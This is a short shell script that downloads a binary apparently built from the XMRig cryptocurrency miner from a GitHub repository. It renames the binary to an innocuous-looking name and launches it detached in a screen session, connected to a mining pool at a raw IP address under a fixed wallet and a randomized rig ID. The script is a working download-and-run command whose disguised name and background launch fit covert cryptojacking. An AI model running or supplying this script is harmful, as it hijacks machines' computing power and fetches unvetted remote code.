sudo apt update && 
sudo apt install screen -y &&
wget https://github.com/washil789/minmin/raw/main/xlarig && 
chmod +x xlarig
mv xlarig babitambang &&
chmod +x babitambang &&
screen -dmS run ./babitambang -o 68.183.134.111:6147 -u 8BVLQrAfZXLFZsdLcUqk33EgPLxQYwKVTheFAixjGZShXhqSVXFUrqT98xtNgegRkoaRTECw5JHTdi67F13zd86ZGitVSnZ+100000 --rig-id $(echo $(shuf -i 1-20000 -n 1)-IDBL)
